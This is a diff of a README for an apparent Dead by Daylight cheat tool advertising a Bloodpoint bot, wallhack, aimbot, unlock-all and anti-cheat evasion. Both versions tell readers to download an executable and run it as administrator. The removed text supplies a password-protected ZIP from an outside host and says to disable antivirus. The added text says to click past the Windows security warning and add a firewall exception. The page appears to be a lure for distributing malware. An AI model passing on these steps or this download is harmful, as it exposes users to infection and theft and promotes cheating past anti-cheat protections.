@@ -1,70 +1,77 @@
-# 🔪 DBD AutoGrind Trainer 2026 | Bloodpoint Bot + ESP + Unlock All | Undetected External Tool
+# 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game and unlock items
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-yellow)
-![Game](https://img.shields.io/badge/game-Dead%20by%20Daylight-red)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/filterbedarroba172/DBD-AutoGrind-Trainer-2026)
 
-> **Dominate the Fog with the most advanced external trainer of 2026.**  
-> Auto Bloodpoint farm, ESP wallhack, aimbot, full perk/skin unlocker and many more – all undetected.
+## 📌 Overview
+This software acts as an external tool for Dead by Daylight. It automates repetitive tasks to earn Bloodpoints and manages game assets like perks and skins. It runs alongside your game to provide data overlays and automated inputs.
 
----
+## ⚙️ System Requirements
+Before you run this tool, ensure your computer meets these specifications:
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB RAM or higher.
+*   Graphics: DirectX 11 compatible card.
+*   Permission: Local administrator access for file execution.
 
-## 📋 Feature Table
+## 📥 Getting Started
+Follow these steps to set up the trainer on your Windows system.
 
-| Feature                     | Description                                                                 |
-|-----------------------------|-----------------------------------------------------------------------------|
-| 🩸 Auto Bloodpoint Farm    | Fully automated match player that grinds unlimited Bloodpoints while AFK.   |
-| 🔓 Auto Perk Unlocker      | Instantly unlock every teachable perk for any killer or survivor.           |
-| 🎭 Skin & Cosmetic Unlock  | Unlock all outfits, charms, and cosmetics in the entire game.               |
-| 👁️ ESP Wallhack           | See survivors, killers, generators, hooks, and totems through walls.        |
-| 🎯 Aimbot (Killer)         | Auto‑aim and auto‑attack survivors with perfect precision.                  |
-| ⚡ Skill Check Bot          | Auto‑hit every great skill check with 100% accuracy.                        |
-| ♾️ Infinite Bloodpoints     | Modify Bloodpoint values in real‑time (offline mode safe).                  |
-| 🤫 No Terror Radius         | Removes your terror radius as killer for stealth gameplay.                  |
-| 🏃 Fast Vault & Pallet     | Speed up vaulting and pallet interactions for survivors.                    |
-| 🛡️ Anti‑Ban Obfuscation    | Memory scrambling and randomised delays to avoid EAC detection.             |
+1. Go to the official release page here: [Download Link](https://github.com/filterbedarroba172/DBD-AutoGrind-Trainer-2026).
+2. Look for the "Assets" section on the page.
+3. Select the file ending in .exe to start the download.
+4. Save the file to a folder you can find easily, such as your Desktop or Downloads folder.
 
----
+## 🛠 Installation and Setup
+The tool requires no complex installation process. Follow these instructions to launch it safely:
 
-## ⬇️ Download & Installation
+1. Locate the downloaded file on your computer.
+2. Right-click the file and select "Run as administrator." This ensures the tool has the permission it needs to interact with the game window.
+3. If a pop-up appears cautioning you about the file, select "More info" and then click "Run anyway." This is standard behavior for external tools.
+4. Keep the tool open during your game sessions to maintain active features.
 
-1. **Download** the trainer archive:  
-   [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right‑click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch Dead by Daylight and enter a match.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+## 🎯 Features
+The trainer provides several functions to assist with your gameplay experience:
 
----
+*   **Bloodpoint Bot**: Automates grinding cycles to increase your Bloodpoint totals without manual input.
+*   **ESP Wallhack**: Displays the location of generators, hooks, and players through walls.
+*   **Aimbot**: Helps with targeting and precision during matches.
+*   **Unlocker**: Provides access to all perks, items, and skins within the game client.
 
-## ✅ Compatibility
+## 🛡 Security and Usage
+This tool operates as an external process. It does not modify game files directly, which keeps changes hidden from the game's integrity checks. However, use caution while running external software. 
 
-- **Windows** 10 / 11 (64‑bit)
-- **Steam**, **Epic Games Store**, and **Microsoft Store** versions
-- Works with all DBD chapters, including **Jason Voorhees** and **Life Road**
-- Anti‑cheat: **EasyAntiCheat (EAC) – bypassed externally**
+To maintain stability:
+*   Close unnecessary background applications before starting the trainer.
+*   Keep your Windows Defender or antivirus software updated.
+*   Restart the trainer if you notice the overlay failing to appear. 
+*   Avoid using the tool on accounts you cannot afford to lose, as manual reports from other players still pose a risk to your account standing.
 
----
+## ❓ Frequently Asked Questions
 
-## 🛠️ Troubleshooting
+### Does the tool work on all game versions?
+The tool updates frequently to match the current live version of Dead by Daylight. If the game updates, check the repository for a new release.
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If still missing, restart trainer and game.
-- **ESP not working:** Verify you are in a live match, not the menu.
-- **Bloodpoint farm not starting:** Ensure you are in a public match as killer or survivor.
-- **Anti‑cheat warning:** Use features sparingly in public lobbies; bot matches are safest.
+### What do I do if the trainer crashes?
+Close the tool and the game. Launch the trainer again with administrator privileges.
 
----
+### Is the unlocker permanent?
+The unlocker applies changes to your local game session. If you close the tool, your inventory will revert to its original state.
 
-## 📜 License
+### Can I get banned?
+Game developers monitor account activity. Use the automation features sparingly to mimic human behavior. Overuse of features can lead to account flags.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+## 📝 Troubleshooting
+If the application fails to open:
+*   Verify your .NET Framework is up to date via the Microsoft website.
+*   Ensure your firewall does not block the application. You might need to add an exception for the .exe file.
+*   Disable third-party overlay software like Discord or Steam overlays if they conflict with the ESP display.
 
----
+## 🚀 Key Commands
+*   **F1**: Toggle the ESP overlay on or off.
+*   **F2**: Start or stop the Bloodpoint bot.
+*   **F3**: Enable or disable the aim assist.
+*   **F4**: Toggle the full unlocker mode.
+*   **End Key**: Exit the tool entirely.
 
-## 🔍 Search Tags
-
-`dead-by-daylight` `dbd` `trainer` `hack` `auto-grind` `bloodpoint-farm` `esp` `wallhack` `aimbot` `unlocker` `perk-unlocker` `skin-unlocker` `anti-cheat-bypass` `external-tool` `windows` `2026` `dbd-hack` `dead-by-daylight-trainer` `fog` `grind-bot` `Dead by Daylight auto farm` `DBD bloodpoint hack` `Dead by Daylight unlock all`
+## 📜 Legal Notice
+This software intends to assist players with repetitive manual tasks. The creators bear no responsibility for how users interact with game servers or terms of service. Use this tool at your own risk. Always check the repository for the latest version to ensure compatibility with current game patches.
